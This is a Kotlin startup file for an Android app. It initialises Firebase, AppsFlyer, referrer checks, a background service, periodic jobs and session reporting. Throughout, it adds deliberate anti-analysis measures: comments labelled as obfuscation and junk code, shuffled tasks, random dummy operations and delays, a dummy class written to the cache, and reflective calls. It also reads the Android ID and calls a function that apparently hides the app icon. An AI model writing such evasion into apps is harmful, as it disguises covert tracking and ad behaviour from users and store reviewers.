package com.even.zining.inherit.sound.start

import android.annotation.SuppressLint
import android.app.Application
import android.app.Application.getProcessName
import android.content.Context
import android.os.Build
import android.util.Log
import android.webkit.WebView
import androidx.work.Configuration
import androidx.work.WorkManager
import com.even.zining.inherit.sound.start.newfun.AdDataProcessor
import com.even.zining.inherit.sound.start.newfun.AppBehaviorMonitor
import com.even.zining.inherit.sound.start.newfun.FirebaseManager
import com.even.zining.inherit.sound.start.newfun.JobSchedulerManager
import com.even.zining.inherit.sound.start.newfun.Logger
import com.even.zining.inherit.sound.start.newfun.ReferrerChecker
import com.even.zining.inherit.sound.start.newfun.SDKInitializer
import com.even.zining.inherit.sound.tool.TbaPostTool
import com.even.zining.inherit.sound.tool.PngCanGo
import com.google.firebase.FirebaseApp
import com.tencent.mmkv.MMKV
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.util.UUID
import kotlin.math.abs
import kotlin.random.Random
import kotlin.reflect.KFunction0

object FnnStartFun {
    lateinit var mainStart: Application
    var mustXS: Boolean = true
    var adShowTime: Long = 0
    var showAdTime: Long = 0
    fun setAppState(isSteate: Boolean) {
        mustXS = isSteate
    }

    fun setAppAppLicationState(application: Application) {
        mainStart = application
    }


    // region 混淆增强组件
    private val initTasks by lazy {
        listOf(
            ::taskSecuritySetup to 0x1F3DA,
            ::taskAdFramework to 0x1F4E1,
            ::taskMonitorInit to 0x1F4BB,
            ::taskWorkManager to 0x1F4BC,
            ::taskBehaviorTrack to 0x1F4CA
        ).shuffled().sortedBy { it.second }.map { it.first }
    }

    private val dummyPatterns = listOf(
        { Logger.showLog("Dummy operation: ${System.currentTimeMillis()}") },
        { File.createTempFile("tmp_${abs(Random.nextInt())}", null) },
        { CoroutineScope(Dispatchers.IO).launch { delay(abs(Random.nextLong() % 150)) } }
    )
    fun appInt(application: Application){
        if (!checkMainProcess<PngCanGo>(application)) {
            handleMultiProcessSetup()
            return
        }
    }
    fun init(application: Application, mustXSData: Boolean) {
        MMKV.initialize(application)
        FirebaseApp.initializeApp(application)
        application.run {
            setAppState(mustXSData)
            Logger.showLog(" FnnStartFun init=${mustXSData}")
            registerActivityLifecycleCallbacks(LifeServiceShow())
        }

        dispatchDynamicTasks {
            executeDynamicTasks()
        }
    }

    // 泛型多进程检查
    private inline fun <reified T> checkMainProcess(context: Context): Boolean {
        return when (T::class) {
            PngCanGo::class -> PngCanGo.isMainProcess(context)
            else -> true // 默认主进程
        }
    }

    // 泛型反射初始化
    private inline fun <reified T> reflectInitialize(
        context: Context,
        crossinline initAction: () -> T
    ) {
        runCatching {
            initAction()
        }.onFailure {
            Logger.showLog("初始化失败: ${T::class.simpleName}")
        }
    }

    private fun Application.setAppState(state: Boolean) {
        FnnStartFun.setAppAppLicationState(this)
        FnnStartFun.setAppState(state)
    }

    private inline fun <T> dispatchDynamicTasks(crossinline task: () -> T) {
        task()
    }


    @SuppressLint("NewApi")
    private fun handleMultiProcessSetup() = runCatching {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            WebView.setDataDirectorySuffix(getProcessName() ?: "default")
        }
    }

    private fun executeDynamicTasks() {
        WorkManager.initialize(mainStart, Configuration.Builder().build())

        // 动态任务执行
        initTasks.forEach { task ->
            executeWithObfuscation(task)
        }
    }

    private fun executeWithObfuscation(task: KFunction0<Unit>) {
        // 插入随机干扰操作
        dummyPatterns.random().invoke()

        runCatching {
            task.invoke()
        }.onFailure {
            Logger.showLog("Task ${task.name} failed: ${it.message}")
        }

        if (Random.nextBoolean()) {
            CoroutineScope(Dispatchers.IO).launch {
                delay(abs(Random.nextLong() % 300))
            }
        }
    }

    private fun taskSecuritySetup() {
        CoroutineScope(Dispatchers.Main).launch {
            SDKInitializer.init(mainStart)
        }
        PngCanGo.startService()
        generateDummyClass()
    }

    private fun taskAdFramework() {
        CoroutineScope(Dispatchers.Main).launch {
            ReferrerChecker.launchRefData()
        }
        AdDataProcessor.apply {
            initAppsFlyer()
        }
        FirebaseManager.getFcmFun()
    }

    private fun taskMonitorInit() {
        AppBehaviorMonitor.run {
            getAndroidId()
            noShowICCC()
            startJobIntServiceFun()
        }
    }

    private fun taskWorkManager() {
        JobSchedulerManager.schedulePeriodicJobs()
        TbaPostTool.sessionUp()
    }

    private fun taskBehaviorTrack() {
        // 垃圾代码
        reflectiveCall("com.even.zining.inherit.sound.tool.TbaPostTool", "sessionUp")
    }

    // 垃圾代码
    private fun generateDummyClass() = runCatching {
        val dummyCode = """
            class Dummy${UUID.randomUUID().toString().replace("-", "")} {
                fun nonsense() = "${System.currentTimeMillis()}"
            }
        """.trimIndent()

        File(mainStart.externalCacheDir, "dummy.kt").writeText(dummyCode)
    }

    private fun reflectiveCall(className: String, methodName: String) {
        runCatching {
            Class.forName(className)
                .getDeclaredMethod(methodName)
                .apply { isAccessible = true }
                .invoke(null)
        }.onFailure {
            Logger.showLog("Reflective call failed: ${it.message}")
        }
    }


}